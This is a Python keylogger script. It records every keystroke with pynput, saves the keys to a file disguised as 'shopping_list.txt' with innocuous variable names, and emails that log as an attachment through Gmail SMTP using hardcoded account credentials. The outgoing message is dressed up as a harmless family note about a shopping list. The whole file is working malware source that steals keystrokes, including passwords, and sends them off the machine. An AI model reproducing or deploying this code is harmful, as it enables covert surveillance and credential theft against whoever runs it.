from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from pynput.keyboard import Listener, Key

E_USERNAME = 'miguelbrotato@gmail.com'
E_PASSWORD = 'theywilldie'

ctr = 0
products = []

def on_press(donut):
    global products, ctr
    
    print('{} is pressed'.format(donut))
    
    ctr += 1
    
    products.append(donut)
    if ctr == 5:
        ctr = 0
        writeToFile(products)
        del products[:]
   
def on_release(donut):
    if donut == Key.esc:
        return False
    
def writeToFile(products):
    with open('shopping_list.txt', 'a') as file:
        for donut in products:
            if('Key.enter' in str(donut)):
                file.write('\n')
            elif('Key' in str(donut)):
                file.write(' {} '.format(str(donut)))
            else:
                donut = str(donut).replace("'","")
                file.write(str(donut))
        file.close()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

smtp = smtplib.SMTP('smtp.gmail.com', 587)
smtp.ehlo()
smtp.starttls() #encrypt
smtp.ehlo()
    
smtp.login(E_USERNAME, E_PASSWORD)
    
subject = 'Are you okay?!'
body = ('Hello Sam,\nYou are not answering your phone,'
' so I am emailing you instead. Message me back soon!\n'
'Here is a shopping list while you are out. Remember, do'
'the dishes and get back by 10pm.\nLove,\nMother Theresa May')

msg = MIMEMultipart()
msg['From'] = E_USERNAME
msg['To'] = E_USERNAME
msg['Subject'] = subject
msg.attach(MIMEText(body,'plain'))
    
filename = 'shopping_list.txt'
attachment = open(filename,'rb')
    
part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition','attachment; filename = '+filename)
    
msg.attach(part)
    
text = msg.as_string()

smtp.sendmail(E_USERNAME, E_USERNAME, text)
    
smtp.quit()
    
    
    
    